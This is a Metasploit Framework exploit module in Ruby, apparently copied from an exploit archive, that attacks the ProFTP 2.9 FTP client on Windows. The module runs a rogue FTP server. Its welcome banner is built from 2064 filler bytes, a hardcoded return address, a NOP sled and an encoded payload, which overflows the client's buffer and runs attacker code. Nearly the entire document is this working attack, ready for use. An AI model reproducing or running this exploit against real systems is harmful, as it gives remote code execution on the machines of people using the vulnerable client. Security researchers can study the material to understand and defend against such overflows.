ProFTP 2.9 (welcome message) Remote Buffer Overflow Exploit (meta)
==================================================================


# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;ProFTP 2.9 (welcome message) Remote Buffer Overflow Exploit&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a buffer overflow in the ProFTP 2.9
				client that is triggered through an excessively long welcome message.
			},
			&#039;Author&#039; 	 => [ &#039;His0k4 <his0k4.hlm[at]gmail.com>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision$&#039;,
			&#039;References&#039;     => 
				[ 
					[ &#039;URL&#039;, &#039;http://www.labtam-inc.com/index.php?act=products&pid=1&#039; ],
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;seh&#039;,
				},
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 1000,
					&#039;BadChars&#039; => "\x00\x0a\x0d\x20",
					&#039;StackAdjustment&#039; => -3500,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        => 
				[
				# Tested against- xp sp3 en OK.
					[ &#039;Universal&#039;, 	{ &#039;Ret&#039; => 0x6809d408 } ], # WCMDPA10
				],
			&#039;Privileged&#039;     => false,
			&#039;DefaultTarget&#039;  => 0))

		register_options(
			[ 
				OptPort.new(&#039;SRVPORT&#039;, [ true, "The FTP daemon port to listen on", 21 ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)	

		buffer =  "220 "
		buffer << rand_text_numeric(2064)
		buffer << [target.ret].pack(&#039;V&#039;)
		buffer << make_nops(20)
		buffer << payload.encoded
		buffer << "\r\n"
		client.put(buffer)
	end
	
end



